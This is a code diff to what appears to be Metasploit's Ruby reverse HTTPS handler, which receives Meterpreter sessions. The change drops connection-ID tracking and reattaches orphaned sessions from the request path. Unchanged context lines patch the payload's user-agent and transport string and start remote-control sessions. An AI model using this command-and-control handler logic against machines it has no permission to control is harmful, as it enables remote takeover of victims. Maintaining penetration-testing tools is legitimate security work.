@@ -150,8 +150,6 @@ module ReverseHttps
 			},
 			'VirtualDirectory' => true)
 
-		self.conn_ids = []
-
 		uhost = datastore['LHOST']
 		uhost = "[#{uhost}]" if Rex::Socket.is_ipv6?(uhost)
 		print_status("Started HTTPS reverse handler on https://#{uhost}:#{datastore['LPORT']}/")
@@ -180,7 +178,6 @@ module ReverseHttps
 	end
 
 	attr_accessor :service # :nodoc:
-	attr_accessor :conn_ids
 
 protected
 
@@ -224,7 +221,6 @@ protected
 				blob << [packet.length+8, 0].pack('NN') + packet
 
 				resp.body = blob
-				conn_ids << conn_id
 
 				# Short-circuit the payload's handle_connection processing for create_session
 				create_session(cli, {
@@ -252,9 +248,8 @@ protected
 					blob[i, str.length] = str
 					print_status("Patched user-agent at offset #{i}...")
 				end
-				
-				
-				# Replace the transport string first (TRANSPORT_SOCKET_SSL
+
+				# Replace the transport string first (TRANSPORT_SOCKET_SSL)
 				i = blob.index("METERPRETER_TRANSPORT_SSL")
 				if i
 					str = "METERPRETER_TRANSPORT_HTTPS\x00"
@@ -286,8 +281,6 @@ protected
 
 				resp.body = blob
 
-				conn_ids << conn_id
-
 				# Short-circuit the payload's handle_connection processing for create_session
 				create_session(cli, {
 					:passive_dispatcher => obj.service,
@@ -298,23 +291,22 @@ protected
 					:ssl                => true
 				})
 
-			when /^\/(CONN_.*)\//
+			when /^\/CONN_.*\//
 				resp.body = ""
-				conn_id = $1
+				# Grab the checksummed version of CONN from the payload's request.
+				conn_id = req.relative_resource[1,21]
 
-				if not self.conn_ids.include?(conn_id)
-					print_status("Incoming orphaned session #{conn_id}, reattaching...")
-					conn_ids << conn_id
+				print_status("Incoming orphaned session #{conn_id}, reattaching...")
 
-					create_session(cli, {
-						:passive_dispatcher => obj.service,
-						:conn_id            => conn_id,
-						:url                => "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00",
-						:expiration         => datastore['SessionExpirationTimeout'].to_i,
-						:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
-						:ssl                => true
-					})
-				end
+				create_session(cli, {
+					:passive_dispatcher => obj.service,
+					:conn_id            => conn_id,
+					:url                => "https://#{datastore['LHOST']}:#{datastore['LPORT']}/" + conn_id + "/\x00",
+					:expiration         => datastore['SessionExpirationTimeout'].to_i,
+					:comm_timeout       => datastore['SessionCommunicationTimeout'].to_i,
+					:ssl                => true
+				})
+
 			else
 				print_status("#{cli.peerhost}:#{cli.peerport} Unknown request to #{uri_match} #{req.inspect}...")
 				resp.code    = 200
